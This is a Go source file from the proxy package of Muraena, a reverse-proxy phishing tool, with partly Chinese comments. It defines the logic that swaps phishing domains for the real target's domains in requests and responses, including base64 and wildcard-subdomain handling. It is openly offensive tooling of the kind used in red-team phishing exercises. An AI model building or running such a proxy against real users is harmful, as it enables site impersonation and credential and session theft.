package proxy

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
)

var (
	Wildcards = false
)

const (
	// Base64Padding is the padding to use within base64 operations
	Base64Padding = '='

	// Wildcard key
	WildcardPrefix = "wld"
)

// Replacer 结构被用于填充转换规则
type Replacer struct {
	Phishing                      string
	Target                        string
	ExternalOrigin                []string
	ExternalOriginPrefix          string
	OriginsMapping                map[string]string // 外部源与内部源之间的映射
	WildcardMapping               map[string]string
	CustomResponseTransformations [][]string
	ForwardReplacements           []string
	BackwardReplacements          []string
	LastForwardReplacements       []string
	LastBackwardReplacements      []string

	WildcardDomain string
}

// Base64 identifies if the transformation should consider base-64 data and the related padding rules
type Base64 struct {
	Enabled bool
	Padding []string
}

// Transform
// 如果与 forward=true 一起使用，Transform 使用 Replacer 将所有出现的网络钓鱼源、定义的外部域以及 MakeReplacements() 中定义的要替换的其余数据替换为目标真实源
// forward=true -> 更改请求
// 如果与 forward=false 一起使用，Transform 将用真实的代理源（目标）替换来自目标源的数据
// forward=false -> 更改响应
// Base64:
// 由于某些请求参数值可以进行 base64 编码，因此我们需要先解码，应用转换并重新编码
func (r *Replacer) Transform(input string, forward bool, b64 Base64) (result string) {

	original := input
	if strings.TrimSpace(input) == "" {
		return input
	}

	var replacements []string
	var lastReplacements []string
	if forward {
		replacements = r.ForwardReplacements
		lastReplacements = r.LastForwardReplacements
	} else { // used in Responses
		replacements = r.BackwardReplacements
		lastReplacements = r.LastBackwardReplacements
	}

	// 处理在转换之前应解码的 Base64 编码数据
	input, base64Found, padding := transformBase64(input, b64, true, Base64Padding)

	// Replace 转换
	replacer := strings.NewReplacer(replacements...)
	result = replacer.Replace(input)

	// 进行最后的替换
	replacer = strings.NewReplacer(lastReplacements...)
	result = replacer.Replace(result)

	// 如果找到 Base64 编码数据，则重新编码
	if base64Found {
		result, _, _ = transformBase64(result, b64, false, padding)
	}

	if original != result {
		// 处理前后不一致
		// 查找通配符匹配
		if Wildcards {
			var rep []string

			wldPrefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
			// result 中是否有通配符
			if strings.Contains(result, "."+wldPrefix) {

				// URL 编码处理
				urlEncoded := false
				decodedValue, err := url.QueryUnescape(result)
				// URL 解码
				if err == nil && result != decodedValue {
					urlEncoded = true
					result = decodedValue
				}
				// 对 r.Phishing 中的特殊字符进行转义
				domain := regexp.QuoteMeta(r.Phishing)
				re := regexp.MustCompile(fmt.Sprintf(`[a-zA-Z0-9.-]+%s\d+.%s`, WildcardPrefix, domain))
				// 找 result 中是否有 r.Phishing
				matchSubdomains := re.FindAllString(result, -1)
				matchSubdomains = ArmorDomain(matchSubdomains)
				if len(matchSubdomains) > 0 {
					log.Debug("Wildcard pattern: %v match %d!", re.String(), len(matchSubdomains))
				}

				for _, element := range matchSubdomains {
					if core.StringContains(element, rep) {
						continue
					}

					if strings.HasPrefix(element, ".") {
						continue
					}

					if strings.HasPrefix(element, wldPrefix) {
						// log.Warning("Do you want to kill me?! [%s]", element)
						continue
					}

					// Patch the wildcard
					element = strings.ReplaceAll(element, "."+wldPrefix, "-"+wldPrefix)
					rep = append(rep, element)
					// log.Info("[*] New wildcard %s", tui.Bold(tui.Red(element)))
				}

				if urlEncoded {
					encodedValue, err := url.QueryUnescape(result)
					if err != nil {
						log.Error(err.Error())
					} else {
						result = encodedValue
					}
				}

				if len(rep) > 0 {
					rep = ArmorDomain(rep)

					// Fix the domains
					patched := r.patchWildcard(rep)
					// Re-do domain mapping
					r.ExternalOrigin = ArmorDomain(append(r.ExternalOrigin, patched...))

					if err := r.DomainMapping(); err != nil {
						log.Error(err.Error())
						return
					}

					r.MakeReplacements()
					log.Debug("We need another transformation loop, because of this new domains: %s",
						tui.Green(fmt.Sprintf("%v", rep)))
					return r.Transform(input, forward, b64)
				}
			}
		}
	}

	return
}

func transformBase64(input string, b64 Base64, decode bool, padding rune) (output string, base64Found bool, padding_out rune) {
	// Handling of base64 encoded data, that should be decoded/transformed/re-encoded
	base64Found = false
	if b64.Enabled { // decode
		if decode {
			var decoded string
			if len(b64.Padding) > 1 {
				for _, p := range b64.Padding {
					padding = getPadding(p)
					if decoded, base64Found = base64Decode(input, padding); base64Found {
						input = decoded
						base64Found = true
						break
					}
				}
			}
		} else {
			//encode
			return base64Encode(input, padding), base64Found, padding
		}
	}

	return input, base64Found, padding
}

// TODO rename me to a more appropriate name . .it's not always URL we transform here, see cookies
func (r *Replacer) transformUrl(URL string, base64 Base64) (result string, err error) {
	result = r.Transform(URL, true, base64)

	// After initial transformation round.
	// If the input is a valid URL proceed by tranforming also the query string

	hURL, err := url.Parse(result)
	if err != nil || hURL.Scheme == "" || hURL.Host == "" {
		// Not valid URL, but continue anyway it might be the case of different values.
		// Log the error and reset its value
		// log.Debug("Error while url.Parsing: %s\n%s", result, err)
		err = nil
		return
	}

	query, err := core.ParseQuery(hURL.RawQuery)
	if err != nil {
		return
	}

	for pKey := range query {
		for k, v := range query[pKey] {
			query[pKey][k] = r.Transform(v, true, base64)
		}
	}
	hURL.RawQuery = query.Encode()
	result = hURL.String()
	return
}

func (r *Replacer) patchWildcard(rep []string) (prep []string) {

	rep = ArmorDomain(rep)
	for _, s := range rep {
		found := false
		newDomain := strings.TrimSuffix(s, fmt.Sprintf(".%s", r.Phishing))
		for w, d := range r.WildcardMapping {
			if strings.HasSuffix(newDomain, d) {
				newDomain = strings.TrimSuffix(newDomain, d)
				newDomain = strings.TrimSuffix(newDomain, "-")
				if newDomain != "" {
					newDomain = newDomain + "."
				}
				newDomain = newDomain + w

				//log.Info("[*] New wildcard %s (%s)", tui.Bold(tui.Red(s)), tui.Green(newDomain))
				prep = append(prep, newDomain)
				found = true
			}
		}

		if !found {
			log.Error("Unknown wildcard domain: %s within %s", tui.Bold(tui.Red(s)), rep)
		}
	}

	return prep
}

// MakeReplacements 准备在 proxy 中使用的前向与后向替换
func (r *Replacer) MakeReplacements() {

	// r.ForwardReplacements = [r.Phishing, r.Target]
	r.ForwardReplacements = []string{}
	r.ForwardReplacements = append(r.ForwardReplacements, []string{r.Phishing, r.Target}...)

	log.Debug("[Forward | origins]: %d", len(r.OriginsMapping))
	count := len(r.ForwardReplacements)
	// extOrigin 为外部源，subMapping 为内部源
	for extOrigin, subMapping := range r.OriginsMapping { // changes resource-1.phishing.
		// subMapping 是否以 "wld" 为前缀
		if strings.HasPrefix(subMapping, WildcardPrefix) {
			// 忽略通配符
			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(extOrigin))
			continue
		}

		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		to := extOrigin
		rep := []string{from, to}
		// r.ForwardReplacements = [subMapping.Phishing, extOrigin]
		r.ForwardReplacements = append(r.ForwardReplacements, rep...)

		count++
		log.Debug("[Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
	}

	// 在最后添加 wildcards
	for extOrigin, subMapping := range r.WildcardMapping {
		from := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		to := extOrigin
		rep := []string{from, to}
		r.ForwardReplacements = append(r.ForwardReplacements, rep...)

		count++
		log.Debug("[Wild Forward | replacements #%d]: %s > %s", count, tui.Yellow(rep[0]), tui.Green(to))
	}

	// r.BackwardReplacements = [r.Target, r.Phishing]
	r.BackwardReplacements = []string{}
	r.BackwardReplacements = append(r.BackwardReplacements, []string{r.Target, r.Phishing}...)

	count = 0
	// include 为外部源
	// subMapping 为内部源
	// 这与前面有什么区别呢？
	for include, subMapping := range r.OriginsMapping {

		if strings.HasPrefix(subMapping, WildcardPrefix) {
			log.Debug("[Wildcard] %s - %s", tui.Yellow(subMapping), tui.Green(include))
			continue
		}

		from := include
		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		rep := []string{from, to}
		r.BackwardReplacements = append(r.BackwardReplacements, rep...)

		count++
		log.Debug("[Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
	}

	// 最后添加通配符
	for include, subMapping := range r.WildcardMapping {
		from := include
		to := fmt.Sprintf("%s.%s", subMapping, r.Phishing)
		rep := []string{from, to}
		r.BackwardReplacements = append(r.BackwardReplacements, rep...)

		count++
		log.Debug("[Wild Backward | replacements #%d]: %s < %s", count, tui.Green(rep[0]), tui.Yellow(to))
	}

	// 最终替换
	r.LastBackwardReplacements = []string{}

	// 常规 HTTP response 替换，添加到 r.BackwardReplacements 中
	for _, tr := range r.CustomResponseTransformations {
		r.LastBackwardReplacements = append(r.LastBackwardReplacements, tr...)
		log.Debug("[Custom Replacements] %+v", tr)
	}

	r.BackwardReplacements = append(r.BackwardReplacements, r.LastBackwardReplacements...)

}

func (r *Replacer) DomainMapping() (err error) {

	// d := strings.Split(r.Target, ".")
	//baseDom := fmt.Sprintf("%s.%s", d[len(d)-2], d[len(d)-1])

	// 将 baseDom 更改为实际的目标域
	baseDom := r.Target
	log.Debug("Proxy destination: %s", tui.Bold(tui.Green("*."+baseDom)))

	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)
	r.OriginsMapping = make(map[string]string)
	r.WildcardMapping = make(map[string]string)

	count, wildcards := 0, 0
	for _, domain := range r.ExternalOrigin {
		if IsSubdomain(baseDom, domain) {
			// domain 去除 baseDom 的后缀
			trim := strings.TrimSuffix(domain, baseDom)

			// 不映射一级子域名
			if strings.Count(trim, ".") < 2 {
				log.Debug("Ignore: %s [%s]", domain, trim)
				continue
			}
		}

		if isWildcard(domain) {
			wildcards++

			// domain 去除通配符
			domain = strings.TrimPrefix(domain, "*.")

			// 更新通配符映射 domain -> ExternalOriginPrefix|"wld"|wildcards
			prefix := fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardPrefix)
			o := fmt.Sprintf("%s%d", prefix, wildcards)
			r.WildcardDomain = o
			r.WildcardMapping[domain] = o
			//log.Info("Wild Including [%s]=%s", domain, o)
			log.Debug(fmt.Sprintf("Wild Including [%s]=%s", domain, o))

		} else {
			count++
			// 额外 domains 或嵌套子域
			o := fmt.Sprintf("%s%d", r.ExternalOriginPrefix, count)
			// domain -> ExternalOriginPrefix|count
			r.OriginsMapping[domain] = o
			//log.Info("Including [%s]=%s", domain, o)
			log.Debug(fmt.Sprintf("Including [%s]=%s", domain, o))
		}

	}

	if wildcards > 0 {
		Wildcards = true
	}

	log.Debug("Processed %d domains to transform, %d are wildcards", count, wildcards)

	return
}
